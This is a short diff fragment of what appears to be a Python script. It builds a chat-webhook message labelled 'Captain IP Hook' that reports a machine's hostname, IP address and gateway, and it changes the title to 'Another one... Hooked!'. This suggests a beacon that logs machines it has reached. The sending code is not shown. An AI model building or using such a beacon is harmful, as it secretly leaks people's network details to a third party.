@@ -15,7 +15,7 @@ data = {
     'username': 'Captain IP Hook',
     'embeds': [{
         'color': 3066993,
-        'title': 'Host is up, Have fun!',
+        'title': 'Another one... Hooked!',
         'description': '**hostname: **' + host + '\n' + '**IP: **' + ipaddr + '\n' + '**Gateway: **' + gateway,
     }]
 }
